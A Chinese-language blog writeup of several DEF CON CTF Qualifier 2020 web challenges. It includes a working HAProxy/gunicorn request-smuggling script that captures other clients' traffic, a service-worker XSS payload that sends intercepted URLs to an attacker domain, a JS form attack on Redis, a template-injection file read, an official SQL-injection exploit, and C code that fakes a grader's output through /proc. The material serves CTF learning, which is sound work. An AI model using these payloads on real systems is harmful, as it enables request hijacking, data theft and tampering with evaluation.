Title = "Defcon CTF Qual 2020  writeup "

description = "Defcon 2020 Qual 的 web"

tags = ["CTF","WriteUp"] 

publishtime = 2020-05-21T00:03:54 
lastedittime = 2020-05-21T00:03:54 
uuid = "b21e18dd-0a44-4b99-81e1-ad9c76e4c43f"
-+_+-



## uploooadit



题目环境：

> server: gunicorn/20.0.0
>
> via: haproxy
>
> lib:  boto3  flask

https://nathandavison.com/blog/haproxy-http-request-smuggling

https://www.cnblogs.com/icez/p/haproxy_http_request_smuggling.html

找了一下 gunicorn 与 haproxy 是存在 CL 与 TE 之间解析差异的，这就导致了 smuggling 。

具体情况应该是 在 haproxy 的时候是按 CL 解析的，然后好像在发往backend  gunicorn 的时候把 CL抛弃了，只留下 TE，到达 backend 以后是优先按 TE

通过使其 `time out` 或者 `openssl s_client -connect uploooadit.oooverflow.io:443` 报错得到 haproxy  的版本 1.9.10

https://github.com/benoitc/gunicorn/releases

查看releases 知道 gunicorn 的 fix 在 20.0.1，因此 20.0.0 是仍然存在 smuggling 的。

通过下面这个确认存在 CL-TE smuggling

```
POST /files/ HTTP/1.1
Host: uploooadit.oooverflow.io
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
X-guid: 99999999-9999-9999-9999-999999999992
Content-Type: text/plain
Transfer-Encoding: chunked
Content-Length: 92

0

ET /files/99999999-9999-9999-9999-999999999990 HTTP/1.1
Host: uploooadit.oooverflow.io


```

返回

```html
HTTP/1.1 201 CREATED
Server: gunicorn/20.0.0
Date: Sat, 16 May 2020 06:34:37 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Via: haproxy
X-Served-By: ip-10-0-0-105.us-east-2.compute.internal

HTTP/1.1 400 Bad Request
Content-Type: text/html
Content-Length: 183
Via: haproxy
X-Served-By: ip-10-0-0-105.us-east-2.compute.internal

<html>
  <head>
    <title>Bad Request</title>
  </head>
  <body>
    <h1><p>Bad Request</p></h1>
    Invalid Method &#x27;Invalid HTTP method: &#x27;ET&#x27;&#x27;
  </body>
</html>
```

> if we malform the value of `Transfer-Encoding` a little bit by pre-pending non-printable character like “\x0b” (vertical tab) or “\x0c” (form feed), HAProxy will ignore the header and give precedence to CL header but when this is passed to Gunicorn it will parse the TE header correctly and give precedence to that

然后我们可以挂一个监视，因为它会写入一个对应 uuid 的文件（不能从我们这里发，要从 Haproxy发）来偷流量

```
import socket
import ssl
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def https():
    context = ssl.create_default_context()
    data = b'''4
abcd
0

POST /files/ HTTP/1.1
Host: uploooadit.oooverflow.io
X-guid: 77777777-3333-4444-7777-333344447776
Content-Type: text/plain
Content-Length: 385


'''.replace(b'\n', b'\r\n')
    p = b'''POST /files/ HTTP/1.1
Host: uploooadit.oooverflow.io
Content-Type: text/plain
X-guid: 12345678-2345-2334-2478-1234567890ac
Content-Length: ''' + str(len(data)).encode() + b'''
Transfer-Encoding: \x0cchunked

'''
    p = p.replace(b'\n', b'\r\n') + data
    with socket.create_connection(('uploooadit.oooverflow.io', 443), timeout=5) as conn:
        with context.wrap_socket(conn, server_hostname='uploooadit.oooverflow.io') as sconn:
            sconn.send(p) 
            sconn.recv(10240).decode()


def getone():
    url = "https://uploooadit.oooverflow.io/files/77777777-3333-4444-7777-333344447776"
    res = requests.get(url=url, verify=False)
    return res.text


if  __name__ == "__main__":
    content = ""
    while True:
        try:
            https()
            tmpcon = getone()
            if content != tmpcon:
                content = tmpcon
                with open('run.log','a+') as f:
                    f.write(content + '\n')
        except:
            pass
```

发现有个bot在创建文件，写入flag，然后删掉，结果偷出来不全，搜索一下，根据歌词，以及 CL长度计算出 flag



```
OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl she holds her head up so high/I think I wanna be her best friend, yeah}
```







## Pooot

> The web is becoming more and more dangerous everyday. Our secure pooot proxy allows you to continue your browsing securely and hide your IP address from your visited websites! Give it a swing here: pooot.challenges.ooo



在首页源码中提示了题目的源码  `/source`，下载下来看主要有以下路由

- `/`
- `/<string:domain>/<path:path>`
- `/source`
- `/feedback`

一开始想的是SSRF，但是就是因为这个，导致一整天走偏了，疯狂测试怎么用 JS 去打 redis，ORZ

首先还是搜集题目环境信息

> server：
>
> ​	nginx/1.17.10
>
> libs :  
>
> ​	python-requests/2.23.0



- `doamin/path`路由会使用 python-requests/2.23.0 库来发起请求，相当于一个代理，并且用 bs4 去把请求的 页面结果中 src属性以及 href 属性都替换掉，host部分设置为网站自己本身

```python
@app.route('/<string:domain>/<path:path>')
@app.route('/<string:domain>')
def proxy(domain, path=''):
  protocol = "https"
  if request.headers.getlist("X-Forwarded-For"):
    client_ip = request.headers.getlist("X-Forwarded-For")[0]
  else:
    client_ip = request.remote_addr

  if isIP(domain):
    protocol = "http"
    if not client_ip.startswith("172.25.0.11"):
      app.logger.error(f"Internal IP address {domain} from client {client_ip} not allowed." )
      return "Internal IP address not allowed", 400

  try:
    app.logger.info(f"Fetching URL: {protocol}://{domain}/{path}")
    response = get(f'{protocol}://{domain}/{path}', timeout=1) 
  except:
    return "Could not reach this domain", 400
    
  content_type = response.headers['content-type']
  if "html" in content_type:
    content = response.text
    soup = BeautifulSoup(content, features="html.parser")

    for link in soup.findAll(attrs={"src":True}):
      if not link['src'].startswith("http"):
        oldpath = link['src']
        if not oldpath.startswith("/"):
          oldpath = f"/{oldpath}"
        link['src'] = f"{PROXY_URL}/{domain}{oldpath}"
      else:
        link['src'] = re.sub(r'http[s]*://', PROXY_URL+"/", link['src'], flags=re.IGNORECASE)

    for link in soup.findAll(href=True):
      if not link['href'].startswith("http"):
        oldpath = link['href']
        if not oldpath.startswith("/"):
          oldpath = f"/{oldpath}"
        link['href'] = f"{PROXY_URL}/{domain}{oldpath}"

    head = soup.body
    if head:
      head.append(soup.new_tag('style', type='text/css'))
      head.style.append("""
        footer {
          display: flex;
          justify-content: center;
          padding: 5px;
          color: #fff;
          bottom: 0;
          position: fixed;        
        }
      """)
      div_string =  '<footer><a href="/feedback">Report a broken page</a></footer>'
      div = BeautifulSoup(div_string, features="html.parser")
      soup.html.insert(-1, div)
    
    content = str(soup)
  else:
    content = response.content
  return Response(content, mimetype=content_type)
```

- `feedback` 路由用来提交错误页面，使用 redis 进行异步调用 ， 主要的处理过程  task  并不在源码里，相当于一个黑盒。

```python
@app.route('/feedback', methods=['GET', 'POST'])
def feedback():
  form = FeedbackForm()
  if form.validate_on_submit():
    if "172.25" in form.url.data:
      flash('All internal servers are working fine!')
      app.logger.info('Ignored URL: %s' % (form.url.data))
      return redirect('/')

    flash('Feedback form submitted {}:{}'.format(
        form.problem.data, form.url.data))

    url = re.sub(r'http[s]*://', '', form.url.data)
    job = q.enqueue(
      task,
      url
    )
    app.logger.info('Reported URL: %s' % (form.url.data))
    return redirect('/')
  return render_template('feedback.html', title='Feedback Form', feedform=form)
```

一开始测试发现 `feedback` 与 `doamin/path`都会用python requests库发起请求，从日志中获取到使用的requests的版本为2.23.0，不存在 crlf的漏洞，并且对内网IP进行了一定限制，思路一度卡在SSRF半天，直到下午发现，feedback 除了向请求本身发起访问，还会对里面的 img进行访问，以及解析 js ，这个时候收到了另外一条请求，才发现原来还有另外一个 bot （HeadlessChrome/81.0.4044.129）

```
34.71.10.153 - - [17/May/2020:17:44:33 +0800] "GET /test2.png HTTP/1.1" 404 501 "-" "python-requests/2.23.0"
34.71.10.153 - - [17/May/2020:17:45:01 +0800] "GET /index.html HTTP/1.1" 200 623 "-" "python-requests/2.23.0"
34.71.10.153 - - [17/May/2020:17:45:02 +0800] "GET /aaasdfsd HTTP/1.1" 404 500 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36"
```

当我的思路回到那个黑盒 task 以后，才发现这原来是道 XSS 的题目，现在我们知道了题目的另一个 bot headlesschrome 会解析 js，然后在这里陷入了另一个思维定势，因为它背后用了 redis ，很自然而然的就在考虑怎么用 JS 来完成对 redis 的攻击，但是JS虽然能发起请求，但是HTTP 并不能攻击高版本 redis ，3.2.7开始加入了对 `HOST`等字段的过滤来防止 CRLF。

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
  </head>
  <body>
    <script type="text/javascript">
        function createForm(i){
            let form = document.createElement('form');
            form.action = 'http://172.25.0.104:6379';
            form.method = 'POST';
            form.enctype = 'text/plain';
            let input = document.createElement('input');
            input.name = 'set testkey 12345\x0d\x0aMIGRATE xxx.xxx.xxx.xxx 8888 testkey 0 1000\x0d\x0a';
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
        p = [];
        createForm(p);
        setTimeout(function() {
            window.location = 'http://xxx.xxx.xxx.xxx/?p=' + p;
        }, 3000);
    </script>
  </body>
</html>
```

其实从这里就已经走入死胡同了。。。。赛后看讨论才知道，要利用 chrome 中的 service worker 来拦截网络请求，22333，这里真的是知识盲区了。

https://developers.google.com/web/fundamentals/primers/service-workers

于是利用 XSS 的条件，在service worker 里注册一个任务来截取流量

```js
self.addEventListener('fetch', function(e) {
  e.respondWith(caches.match(e.request).then(function(response) {
    fetch('https://<domain>/ADMIN/' + e.request.url)
});
```

在自己VPS上进行如下部署

```html
<html><body>
<h1>Hello World</h1>
<script>
window.addEventListener('load', function() {
var sw = "https://pooot.challenges.ooo/<domain>/static/sw.js";
navigator.serviceWorker.register(sw, {scope: '/'})
  .then(function(registration) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://<domain>/SW/success", true);
    xhttp2.send();
  }, function (err) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://<domain>/SW/error", true);
    xhttp2.send();
  });
});
</script>
</body></html>
```

收到了日志信息

```
34.71.10.153 - - [18/May/2020:10:43:01 +0000] 
"GET /ADMIN/https://pooot.challenges.ooo/172.25.0.102:3000/ HTTP/1.1" 200
332 "https://pooot.challenges.ooo/<domain>/static/sw.js"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36"

34.71.10.153 - - [18/May/2020:11:21:12 +0000] 
"GET /FLAG/200/OOO%7Bm3lt1ng_p0t_of_s3cur1ty_0r1g1n5%7D HTTP/1.1" 200
333 "https://pooot.challenges.ooo/<domain>"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36"

```

我给跪了，自从思路走入死胡同开始就出不来了。

> 赛后看别人的思路，还有利用 chrome 9222 调试端口的，但是具体怎么做还不清楚



## Dogooos



http://dogooos.challenges.ooo:37453/dogooo/

这道题当时放出来已经很晚了，神智已经不太清晰，连简单的模板注入都没发现

赛后发现 

```
@app.route("/dogooo/deets/<postid>", methods=["GET","POST"])
```

路由存在模板注入，并且没有做过滤



![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/20200518110213.png)

然后直接读就好了

```
{open('/flag').read()}
```







## OOOnline Course



http://ooonline-class.challenges.ooo:5000/

这道题跟 dogooos 放出的时间差不多，一出来就被非预期了，是道 OJ 类型的题目，可以提交代码运行，但是在登陆处有 sql injection （真·黑客大赛，你爱非预期就非预期。。。）给出官方放出的 exp

```python
#!/usr/bin/env python3

import json
import random
import requests
import sys
import time

import logging
logging.basicConfig(level=logging.DEBUG)

def main():

    host = sys.argv[1]
    port = int(sys.argv[2])

    url = f"http://{host}:{port}"

    username = f"attack{random.randint(0, 1000000)}"
    passwd = "testing"

    exploit_username = f"{username}','{passwd}')returning(id),(select(password)from\"users\"where(id)=1)--"
    
    result = requests.post(f"{url}/user/register",
                           json=dict(name=exploit_username,
                                     passwd=passwd))
    assert result.status_code == 200
    r = result.json()
    admin_pass = r['returning_from_db_name']
    assert admin_pass == "zKSTznZYGD"

    username = f"test{random.randint(0, 1000000)}"
    passwd = "testing"
    
    result = requests.post(f"{url}/user/register",
                           json=dict(name=username,
                                     passwd=passwd))
    assert result.status_code == 200
    r = result.json()
    assert 'id' in r

    result = requests.post(f"{url}/user/login",
                           json=dict(name=username,
                                     passwd=passwd))
    assert result.status_code == 200
    r = result.json()
    token = r['token']

    auth_headers = {"X-Auth-Token": token}

    done = False
    while not done:
        result = requests.post(f"{url}/assignment/1/submissions",
                               json=dict(file=open('solution.c', 'r').read()),
                               headers=auth_headers)
        r = result.json()
        id = r['id']

        time.sleep(4)

        while True:

            result = requests.get(f"{url}/submission/{id}/result",
                                  headers=auth_headers)
            r = result.json()
            print(r)

            if 'retry' in r:
                time.sleep(4)
            else:
                if 'Success' in r['message']:
                    print(r['message'][9:])
                    sys.exit(0)
                else:
                    print('trying again')
                    break
                
    sys.exit(-1)

if __name__ == '__main__':
    main()
```

通过 sql injection 获取到 admin 账号，然后查看到 submission ，被非预期之后，官方放出了 revenge ，预期解法是通过 /proc/来覆写stdout 

https://github.com/o-o-overflow/dc2020q-ooonline-class-public/blob/master/interaction/solution.c

```c
#include <sys/types.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

char fake_output[] = "      {\"passed\": true, \"message\": \"you got hacked\"}\n";

int main()
{
   pid_t me;
   char buf[4096];
   char cmd[4096];
   char state;
   pid_t parent;
   int fd;
   char path[4096];
   int num;

   // Get parent pid
   fd = syscall(SYS_open, "/proc/self/stat", O_RDONLY);
   num = read(fd, buf, 4096);
   buf[num] = '\0';

   sscanf(buf, "%d %s %c %d", &me, cmd, &state, &parent);
   //close(fd);

   // Write fake_output to parent stdout (so that that's the output of the grader script)
   snprintf(path, 4096, "/proc/%d/fd/1", parent);
   path[4095] = '\0';

   while (1) {
      fd = syscall(SYS_open, path, O_WRONLY | O_TRUNC);
      write(fd, fake_output, sizeof(fake_output)-1);
      close(fd);
   }

   //close(fd);

   //kill(parent, SIGKILL);

   return 0;
}
```





## bytecode

> if u thought shellcoding was fun, wait until you try bytecoooding
>
> Threshold starts at 8, and decrements by 1 approximately every 5 hours.
>
> bytecoooding.challenges.ooo 5000
>
> Files:
>
> - [bytecode-docker.tar.gz](https://s3.us-east-2.amazonaws.com/oooverflow-challs/207e484cd975dee4af075a4ed699a580acecd4887fa992f46bdf6f851414739a/bytecode-docker.tar.gz) 1e8ce305bae016773364545d69d80d9ab456b4a69beba5036d14b9fedcc2ad9b



输入限制在4096以内，每5个小时会减少一种平台类型来降低难度（新颖的golf 类型题目），需要写bytecode来读文件

bytecode 需要在以下八种平台上同时通过运行  

```python
PLATFORMS = ["jvm", "python3", "python2", "ruby", "lua", "nodejs", "ocaml", "elisp"]
```

它会把 flag 、运行脚本等都弄到一个 tmpdir 里执行

太变态了





python 可以 直接执行 zip 

> Python has been able to execute zip files which contain a \_\_main\_\_.py file since version 2.6. In order to be executed by Python, an application archive simply has to be a standard zip file containing a \_\_main\_\_.py file which will be run as the entry point for the application.





## 总结

国际赛的 web 现在基本都是 复合型 web 了，单纯考 web 的已经很少了，所以web狗们还是要多学学各种知识，扩充自己的知识面。